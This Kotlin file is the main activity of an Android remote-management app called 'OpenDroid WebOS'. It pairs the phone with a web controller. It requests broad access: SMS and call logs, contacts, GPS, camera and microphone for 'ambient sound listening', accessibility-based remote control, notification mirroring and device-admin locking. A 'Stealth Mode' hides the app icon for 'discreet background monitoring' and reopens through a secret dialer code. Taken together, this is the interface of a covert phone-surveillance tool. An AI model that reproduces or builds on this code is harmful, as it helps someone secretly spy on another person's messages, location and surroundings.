package com.example.localutility

import android.annotation.SuppressLint
import android.app.Activity
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.PowerManager
import android.provider.Settings
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.material3.*
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.app.NotificationManagerCompat
import androidx.core.content.ContextCompat
import kotlin.random.Random

class MainActivity : ComponentActivity() {

    private lateinit var nsdManager: NsdDiscoveryManager
    private lateinit var mediaProjectionManager: MediaProjectionManager

    // Phase 6: Central Account & Multi-Device States
    private val boundAccountState = mutableStateOf("")
    private val deviceNameState = mutableStateOf(Build.MODEL ?: "Android Device")

    // Permission States
    private val isStorageGrantedState = mutableStateOf(false)
    private val isBatteryIgnoredState = mutableStateOf(false)
    private val isAccessibilityGrantedState = mutableStateOf(false)
    private val isNotifAccessState = mutableStateOf(false)
    private val isCameraMicGrantedState = mutableStateOf(false)
    private val isPhoneSmsGrantedState = mutableStateOf(false)
    private val isLocationGrantedState = mutableStateOf(false)
    private val isAdminActiveState = mutableStateOf(false)
    private val isStealthActiveState = mutableStateOf(false)

    private val requestPermissionsLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) {
        updateAllPermissionStates()
    }

    private val screenCaptureLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { result ->
        if (result.resultCode == Activity.RESULT_OK && result.data != null) {
            val serviceIntent = Intent(this, ScreenCaptureService::class.java).apply {
                putExtra(ScreenCaptureService.EXTRA_RESULT_DATA, result.data)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent)
            } else {
                startService(serviceIntent)
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val prefs = getSharedPreferences("opendroid_prefs", Context.MODE_PRIVATE)
        var code = prefs.getString("pairing_code", null)
        if (code == null) {
            code = (Random.nextInt(900000) + 100000).toString()
            prefs.edit().putString("pairing_code", code).apply()
        }
        LocalFileServerService.currentPairingCode = code

        // Phase 6: Read saved account binding
        val savedEmail = prefs.getString("account_email", "") ?: ""
        val savedDeviceName = prefs.getString("device_name", Build.MODEL) ?: (Build.MODEL ?: "Android Device")
        boundAccountState.value = savedEmail
        deviceNameState.value = savedDeviceName

        nsdManager = NsdDiscoveryManager(this)
        mediaProjectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager

        val fileServiceIntent = Intent(this, LocalFileServerService::class.java).apply {
            putExtra("PAIRING_CODE", code)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(fileServiceIntent)
        } else {
            startService(fileServiceIntent)
        }

        nsdManager.registerService()

        setContent {
            var selectedTab by remember { mutableStateOf(0) }
            var cloudOnline by remember { mutableStateOf(LocalFileServerService.isCloudConnected) }

            val isStorageGranted by isStorageGrantedState
            val isBatteryIgnored by isBatteryIgnoredState
            val isAccessibilityGranted by isAccessibilityGrantedState
            val isNotifGranted by isNotifAccessState
            val isCameraMicGranted by isCameraMicGrantedState
            val isPhoneSmsGranted by isPhoneSmsGrantedState
            val isLocationGranted by isLocationGrantedState
            val isAdminActive by isAdminActiveState
            val isStealthActive by isStealthActiveState

            DisposableEffect(Unit) {
                cloudOnline = LocalFileServerService.isCloudConnected
                LocalFileServerService.onCloudStatusChanged = { isOnline ->
                    runOnUiThread {
                        cloudOnline = isOnline
                    }
                }
                onDispose {
                    LocalFileServerService.onCloudStatusChanged = null
                }
            }

            MaterialTheme {
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = MaterialTheme.colorScheme.background
                ) {
                    Column(modifier = Modifier.fillMaxSize()) {
                        // Top Header
                        Column(
                            modifier = Modifier
                                .fillMaxWidth()
                                .padding(top = 20.dp, bottom = 8.dp),
                            horizontalAlignment = Alignment.CenterHorizontally
                        ) {
                            Text(
                                text = "OpenDroid WebOS",
                                fontSize = 24.sp,
                                fontWeight = FontWeight.Bold,
                                color = MaterialTheme.colorScheme.primary
                            )

                            Spacer(modifier = Modifier.height(6.dp))

                            Surface(
                                shape = RoundedCornerShape(14.dp),
                                color = if (cloudOnline) Color(0xFFE8F5E9) else Color(0xFFFFF3E0)
                            ) {
                                Text(
                                    text = if (cloudOnline) "🟢 Cloud: Connected & Online (5G)" else "🟡 Cloud: Connecting to Cloud...",
                                    modifier = Modifier.padding(horizontal = 14.dp, vertical = 4.dp),
                                    fontSize = 12.sp,
                                    fontWeight = FontWeight.Bold,
                                    color = if (cloudOnline) Color(0xFF2E7D32) else Color(0xFFE65100)
                                )
                            }
                        }

                        // Navigation Tabs
                        TabRow(
                            selectedTabIndex = selectedTab,
                            modifier = Modifier.fillMaxWidth()
                        ) {
                            Tab(
                                selected = selectedTab == 0,
                                onClick = { selectedTab = 0 },
                                text = { Text("📱 Dashboard", fontWeight = FontWeight.SemiBold) }
                            )
                            Tab(
                                selected = selectedTab == 1,
                                onClick = { selectedTab = 1 },
                                text = { Text("🛡️ Permissions", fontWeight = FontWeight.SemiBold) }
                            )
                        }

                        // Tab 0: Dashboard
                        if (selectedTab == 0) {
                            val boundAccount by boundAccountState
                            val deviceName by deviceNameState
                            var inputEmail by remember { mutableStateOf(boundAccount) }
                            var inputDeviceName by remember { mutableStateOf(deviceName) }

                            Column(
                                modifier = Modifier
                                    .fillMaxSize()
                                    .verticalScroll(rememberScrollState())
                                    .padding(horizontal = 20.dp, vertical = 16.dp),
                                horizontalAlignment = Alignment.CenterHorizontally
                            ) {
                                // --- Phase 6: Central Account & Multi-Device Hub Card ---
                                Card(
                                    modifier = Modifier.fillMaxWidth(),
                                    colors = CardDefaults.cardColors(
                                        containerColor = if (boundAccount.isNotEmpty()) Color(0xFFF1F8E9) else MaterialTheme.colorScheme.surfaceVariant
                                    ),
                                    shape = RoundedCornerShape(16.dp)
                                ) {
                                    Column(modifier = Modifier.padding(18.dp)) {
                                        Row(
                                            verticalAlignment = Alignment.CenterVertically,
                                            modifier = Modifier.fillMaxWidth()
                                        ) {
                                            Text(
                                                text = if (boundAccount.isNotEmpty()) "🌐 Multi-Device Sync: Active" else "🔐 Central Account (Multi-Device)",
                                                fontWeight = FontWeight.Bold,
                                                fontSize = 15.sp,
                                                color = if (boundAccount.isNotEmpty()) Color(0xFF2E7D32) else MaterialTheme.colorScheme.onSurfaceVariant
                                            )
                                        }

                                        Spacer(modifier = Modifier.height(6.dp))

                                        if (boundAccount.isNotEmpty()) {
                                            Text(
                                                text = "Bound to Account:",
                                                fontSize = 11.sp,
                                                color = Color.Gray
                                            )
                                            Text(
                                                text = boundAccount,
                                                fontSize = 14.sp,
                                                fontWeight = FontWeight.SemiBold,
                                                color = Color(0xFF1B5E20)
                                            )
                                            Spacer(modifier = Modifier.height(4.dp))
                                            Text(
                                                text = "Device Name: $deviceName",
                                                fontSize = 12.sp,
                                                fontWeight = FontWeight.Medium,
                                                color = Color.DarkGray
                                            )
                                            Spacer(modifier = Modifier.height(10.dp))
                                            OutlinedButton(
                                                onClick = { unbindAccount() },
                                                colors = ButtonDefaults.outlinedButtonColors(contentColor = Color(0xFFC62828)),
                                                modifier = Modifier.fillMaxWidth(),
                                                shape = RoundedCornerShape(10.dp)
                                            ) {
                                                Text("Unbind from Account", fontSize = 12.sp)
                                            }
                                        } else {
                                            Text(
                                                text = "Sign in with your Email on Web and Phone to manage multiple devices without 6-digit codes.",
                                                fontSize = 12.sp,
                                                color = Color.Gray
                                            )
                                            Spacer(modifier = Modifier.height(10.dp))

                                            OutlinedTextField(
                                                value = inputEmail,
                                                onValueChange = { inputEmail = it },
                                                label = { Text("Account Email", fontSize = 12.sp) },
                                                placeholder = { Text("e.g. user@gmail.com", fontSize = 12.sp) },
                                                singleLine = true,
                                                modifier = Modifier.fillMaxWidth(),
                                                shape = RoundedCornerShape(10.dp)
                                            )

                                            Spacer(modifier = Modifier.height(8.dp))

                                            OutlinedTextField(
                                                value = inputDeviceName,
                                                onValueChange = { inputDeviceName = it },
                                                label = { Text("Device Nickname", fontSize = 12.sp) },
                                                placeholder = { Text(Build.MODEL ?: "Redmi Note 12", fontSize = 12.sp) },
                                                singleLine = true,
                                                modifier = Modifier.fillMaxWidth(),
                                                shape = RoundedCornerShape(10.dp)
                                            )

                                            Spacer(modifier = Modifier.height(12.dp))

                                            Button(
                                                onClick = {
                                                    if (inputEmail.contains("@")) {
                                                        bindAccount(inputEmail, inputDeviceName)
                                                    }
                                                },
                                                enabled = inputEmail.contains("@"),
                                                modifier = Modifier.fillMaxWidth(),
                                                shape = RoundedCornerShape(10.dp)
                                            ) {
                                                Text("🔗 Bind This Device", fontSize = 13.sp)
                                            }
                                        }
                                    }
                                }

                                Spacer(modifier = Modifier.height(16.dp))

                                // Quick Guest 6-Digit Code Card
                                Card(
                                    modifier = Modifier.fillMaxWidth(),
                                    colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant),
                                    shape = RoundedCornerShape(16.dp)
                                ) {
                                    Column(
                                        modifier = Modifier.padding(16.dp),
                                        horizontalAlignment = Alignment.CenterHorizontally
                                    ) {
                                        Text("Direct 6-Digit Guest Code:", fontSize = 13.sp, color = Color.Gray)
                                        Spacer(modifier = Modifier.height(4.dp))
                                        Text(
                                            text = code,
                                            fontSize = 36.sp,
                                            fontWeight = FontWeight.ExtraBold,
                                            fontFamily = FontFamily.Monospace,
                                            color = MaterialTheme.colorScheme.primary
                                        )
                                        Spacer(modifier = Modifier.height(2.dp))
                                        Text(
                                            text = "Instant 1-time remote connection",
                                            fontSize = 11.sp,
                                            color = Color.Gray
                                        )
                                    }
                                }

                                Spacer(modifier = Modifier.height(16.dp))

                                Button(
                                    onClick = {
                                        val captureIntent = mediaProjectionManager.createScreenCaptureIntent()
                                        screenCaptureLauncher.launch(captureIntent)
                                    },
                                    modifier = Modifier.fillMaxWidth(),
                                    shape = RoundedCornerShape(12.dp)
                                ) {
                                    Text("📱 Grant Screen Mirroring", fontSize = 14.sp)
                                }

                                Spacer(modifier = Modifier.height(10.dp))

                                OutlinedButton(
                                    onClick = { selectedTab = 1 },
                                    modifier = Modifier.fillMaxWidth(),
                                    shape = RoundedCornerShape(12.dp)
                                ) {
                                    Text("🛡️ Permissions Setup Wizard", fontSize = 13.sp)
                                }
                            }
                        }

                        // Tab 1: Permissions Setup Wizard
                        if (selectedTab == 1) {
                            Column(
                                modifier = Modifier
                                    .fillMaxSize()
                                    .verticalScroll(rememberScrollState())
                                    .padding(16.dp),
                                verticalArrangement = Arrangement.spacedBy(10.dp)
                            ) {
                                Text(
                                    text = "Permissions Setup Wizard",
                                    fontSize = 16.sp,
                                    fontWeight = FontWeight.Bold,
                                    color = MaterialTheme.colorScheme.primary
                                )
                                Text(
                                    text = "Allow all permissions below for full remote management features.",
                                    fontSize = 12.sp,
                                    color = Color.Gray
                                )

                                Spacer(modifier = Modifier.height(4.dp))

                                // 1. Storage
                                PermissionCard(
                                    title = "All Files Access",
                                    description = "Required to browse, download, and upload files remotely.",
                                    isGranted = isStorageGranted,
                                    onGrantClick = { requestStoragePermission() }
                                )

                                // 2. Battery
                                PermissionCard(
                                    title = "Battery: No Restrictions",
                                    description = "Prevents system task-killer from stopping 5G connection when phone locks.",
                                    isGranted = isBatteryIgnored,
                                    onGrantClick = { requestIgnoreBatteryOptimizations() }
                                )

                                // 3. Accessibility (Remote Control)
                                PermissionCard(
                                    title = "Remote Control (Accessibility)",
                                    description = "Enables mouse clicks, tap, swipe, and navigation buttons from PC.",
                                    isGranted = isAccessibilityGranted,
                                    onGrantClick = { startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) }
                                )

                                // 4. Notifications
                                PermissionCard(
                                    title = "Notification Sync",
                                    description = "Mirrors incoming WhatsApp/SMS notifications to PC with inline reply.",
                                    isGranted = isNotifGranted,
                                    onGrantClick = { startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)) }
                                )

                                // 5. Camera & Microphone
                                PermissionCard(
                                    title = "Camera & Microphone",
                                    description = "Required for live remote camera view and ambient sound listening.",
                                    isGranted = isCameraMicGranted,
                                    onGrantClick = {
                                        requestPermissionsLauncher.launch(
                                            arrayOf(
                                                android.Manifest.permission.CAMERA,
                                                android.Manifest.permission.RECORD_AUDIO
                                            )
                                        )
                                    }
                                )

                                // 6. Phone, SMS & Call Logs
                                PermissionCard(
                                    title = "SMS, Contacts & Call Logs",
                                    description = "Allows reading/sending SMS, viewing contacts, and call history on PC.",
                                    isGranted = isPhoneSmsGranted,
                                    onGrantClick = {
                                        requestPermissionsLauncher.launch(
                                            arrayOf(
                                                android.Manifest.permission.READ_SMS,
                                                android.Manifest.permission.SEND_SMS,
                                                android.Manifest.permission.READ_CONTACTS,
                                                android.Manifest.permission.CALL_PHONE,
                                                android.Manifest.permission.READ_CALL_LOG
                                            )
                                        )
                                    }
                                )

                                // 7. Location (Find Phone)
                                PermissionCard(
                                    title = "GPS Location (Find Phone)",
                                    description = "Shows real-time satellite coordinates on live map when locating phone.",
                                    isGranted = isLocationGranted,
                                    onGrantClick = {
                                        requestPermissionsLauncher.launch(
                                            arrayOf(
                                                android.Manifest.permission.ACCESS_FINE_LOCATION,
                                                android.Manifest.permission.ACCESS_COARSE_LOCATION
                                            )
                                        )
                                    }
                                )

                                // 8. Device Administrator (Remote Lock)
                                PermissionCard(
                                    title = "Device Administrator (Remote Lock)",
                                    description = "Allows locking phone screen remotely from PC Find Phone / Security panel.",
                                    isGranted = isAdminActive,
                                    onGrantClick = { requestDeviceAdmin() }
                                )

                                // 9. Stealth Mode (Hide Launcher App Icon)
                                Card(
                                    modifier = Modifier.fillMaxWidth(),
                                    colors = CardDefaults.cardColors(
                                        containerColor = if (isStealthActive) Color(0xFF2E1B4D) else MaterialTheme.colorScheme.surfaceVariant
                                    ),
                                    shape = RoundedCornerShape(12.dp)
                                ) {
                                    Row(
                                        modifier = Modifier
                                            .fillMaxWidth()
                                            .padding(14.dp),
                                        horizontalArrangement = Arrangement.SpaceBetween,
                                        verticalAlignment = Alignment.CenterVertically
                                    ) {
                                        Column(modifier = Modifier.weight(1f)) {
                                            Text(
                                                text = if (isStealthActive) "🥷 Stealth Mode (Icon Hidden)" else "📱 Stealth Mode (Icon Visible)",
                                                fontWeight = FontWeight.Bold,
                                                fontSize = 14.sp,
                                                color = if (isStealthActive) Color(0xFFE0B0FF) else MaterialTheme.colorScheme.onSurfaceVariant
                                            )
                                            Spacer(modifier = Modifier.height(2.dp))
                                            Text(
                                                text = if (isStealthActive)
                                                    "Icon hidden from app drawer. Dial *#*#1234#*#* on phone or use WebOS to open!"
                                                else
                                                    "Hide OpenDroid icon from app drawer for discreet background monitoring.",
                                                fontSize = 11.sp,
                                                color = Color.Gray,
                                                lineHeight = 15.sp
                                            )
                                        }
                                        Spacer(modifier = Modifier.width(8.dp))
                                        Switch(
                                            checked = isStealthActive,
                                            onCheckedChange = { checked ->
                                                toggleStealthMode(checked)
                                            }
                                        )
                                    }
                                }

                                Spacer(modifier = Modifier.height(16.dp))
                            }
                        }
                    }
                }
            }
        }
    }

    @Composable
    private fun PermissionCard(
        title: String,
        description: String,
        isGranted: Boolean,
        onGrantClick: () -> Unit
    ) {
        Card(
            modifier = Modifier.fillMaxWidth(),
            shape = RoundedCornerShape(12.dp),
            colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant)
        ) {
            Row(
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(14.dp),
                verticalAlignment = Alignment.CenterVertically,
                horizontalArrangement = Arrangement.SpaceBetween
            ) {
                Column(modifier = Modifier.weight(1f).padding(end = 12.dp)) {
                    Text(text = title, fontSize = 14.sp, fontWeight = FontWeight.Bold)
                    Spacer(modifier = Modifier.height(2.dp))
                    Text(text = description, fontSize = 11.sp, color = Color.Gray, lineHeight = 14.sp)
                }

                if (isGranted) {
                    Surface(
                        shape = RoundedCornerShape(8.dp),
                        color = Color(0xFFE8F5E9)
                    ) {
                        Text(
                            text = "Allowed ✓",
                            modifier = Modifier.padding(horizontal = 10.dp, vertical = 6.dp),
                            fontSize = 12.sp,
                            fontWeight = FontWeight.Bold,
                            color = Color(0xFF2E7D32)
                        )
                    }
                } else {
                    Button(
                        onClick = onGrantClick,
                        shape = RoundedCornerShape(8.dp),
                        contentPadding = PaddingValues(horizontal = 14.dp, vertical = 4.dp)
                    ) {
                        Text("Grant", fontSize = 12.sp, fontWeight = FontWeight.SemiBold)
                    }
                }
            }
        }
    }

    override fun onResume() {
        super.onResume()
        updateAllPermissionStates()
    }

    private fun updateAllPermissionStates() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, "android.permission.POST_NOTIFICATIONS") != PackageManager.PERMISSION_GRANTED) {
                requestPermissionsLauncher.launch(arrayOf("android.permission.POST_NOTIFICATIONS"))
            }
        }
        isStorageGrantedState.value = checkStoragePermission()
        isBatteryIgnoredState.value = checkBatteryOptimization()
        isAccessibilityGrantedState.value = checkAccessibilityPermission()
        isNotifAccessState.value = checkNotificationAccess()
        isCameraMicGrantedState.value = checkPermissions(
            arrayOf(android.Manifest.permission.CAMERA, android.Manifest.permission.RECORD_AUDIO)
        )
        isPhoneSmsGrantedState.value = checkPermissions(
            arrayOf(
                android.Manifest.permission.READ_SMS,
                android.Manifest.permission.SEND_SMS,
                android.Manifest.permission.READ_CONTACTS,
                android.Manifest.permission.CALL_PHONE,
                android.Manifest.permission.READ_CALL_LOG
            )
        )
        isLocationGrantedState.value = checkPermissions(
            arrayOf(android.Manifest.permission.ACCESS_FINE_LOCATION, android.Manifest.permission.ACCESS_COARSE_LOCATION)
        )
        isAdminActiveState.value = checkDeviceAdmin()
        isStealthActiveState.value = checkStealthActive()
    }

    private fun checkStealthActive(): Boolean {
        return try {
            val componentName = ComponentName(this, "com.example.localutility.MainActivityAlias")
            packageManager.getComponentEnabledSetting(componentName) == PackageManager.COMPONENT_ENABLED_STATE_DISABLED
        } catch (e: Exception) {
            false
        }
    }

    private fun toggleStealthMode(enableStealth: Boolean) {
        try {
            val componentName = ComponentName(this, "com.example.localutility.MainActivityAlias")
            val newState = if (enableStealth) {
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED
            } else {
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED
            }
            packageManager.setComponentEnabledSetting(componentName, newState, PackageManager.DONT_KILL_APP)
            isStealthActiveState.value = enableStealth
            if (enableStealth) {
                android.widget.Toast.makeText(
                    this,
                    "App icon hidden! Dial *#*#1234#*#* on phone or use WebOS to open.",
                    android.widget.Toast.LENGTH_LONG
                ).show()
            } else {
                android.widget.Toast.makeText(
                    this,
                    "App icon restored to launcher!",
                    android.widget.Toast.LENGTH_SHORT
                ).show()
            }
        } catch (e: Exception) {
            e.printStackTrace()
            android.widget.Toast.makeText(this, "Error: ${e.message}", android.widget.Toast.LENGTH_SHORT).show()
        }
    }

    private fun checkDeviceAdmin(): Boolean {
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val componentName = ComponentName(this, AdminReceiver::class.java)
        return dpm.isAdminActive(componentName)
    }

    private fun requestDeviceAdmin() {
        val componentName = ComponentName(this, AdminReceiver::class.java)
        val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
            putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName)
            putExtra(
                DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                "Allows OpenDroid to remotely lock device screen from Web Controller."
            )
        }
        startActivity(intent)
    }

    private fun checkStoragePermission(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            Environment.isExternalStorageManager()
        } else {
            ContextCompat.checkSelfPermission(
                this,
                android.Manifest.permission.READ_EXTERNAL_STORAGE
            ) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun requestStoragePermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            try {
                val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                    data = Uri.parse("package:$packageName")
                }
                startActivity(intent)
            } catch (e: Exception) {
                startActivity(Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION))
            }
        } else {
            requestPermissionsLauncher.launch(arrayOf(android.Manifest.permission.READ_EXTERNAL_STORAGE))
        }
    }

    private fun checkBatteryOptimization(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            pm.isIgnoringBatteryOptimizations(packageName)
        } else true
    }

    @SuppressLint("BatteryLife")
    private fun requestIgnoreBatteryOptimizations() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:$packageName")
                }
                startActivity(intent)
            } catch (e: Exception) {
                try {
                    startActivity(Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS))
                } catch (e2: Exception) {
                    e2.printStackTrace()
                }
            }
        }
    }

    private fun checkAccessibilityPermission(): Boolean {
        if (RemoteInputService.instance != null) return true
        return try {
            val enabledServices = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES) ?: ""
            val expectedComponent = ComponentName(this, RemoteInputService::class.java).flattenToString()
            val expectedShort = ComponentName(this, RemoteInputService::class.java).flattenToShortString()
            enabledServices.split(":").any {
                it.equals(expectedComponent, ignoreCase = true) ||
                it.equals(expectedShort, ignoreCase = true) ||
                (it.contains(packageName) && it.contains("RemoteInputService"))
            }
        } catch (e: Exception) {
            false
        }
    }

    private fun checkNotificationAccess(): Boolean {
        return NotificationManagerCompat.getEnabledListenerPackages(this).contains(packageName)
    }

    private fun checkPermissions(permissions: Array<String>): Boolean {
        return permissions.all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    // --- Phase 6: Account Binding Helpers ---
    private fun bindAccount(email: String, name: String) {
        val cleanEmail = email.trim().lowercase()
        val cleanName = if (name.trim().isEmpty()) (Build.MODEL ?: "Android Device") else name.trim()
        val prefs = getSharedPreferences("opendroid_prefs", Context.MODE_PRIVATE)
        prefs.edit()
            .putString("account_email", cleanEmail)
            .putString("device_name", cleanName)
            .apply()
        boundAccountState.value = cleanEmail
        deviceNameState.value = cleanName
        LocalFileServerService.instance?.bindAccount(cleanEmail, cleanName)
    }

    private fun unbindAccount() {
        val prefs = getSharedPreferences("opendroid_prefs", Context.MODE_PRIVATE)
        prefs.edit().remove("account_email").apply()
        boundAccountState.value = ""
        LocalFileServerService.instance?.unbindAccount()
    }

    override fun onDestroy() {
        super.onDestroy()
        nsdManager.unregisterService()
    }
}
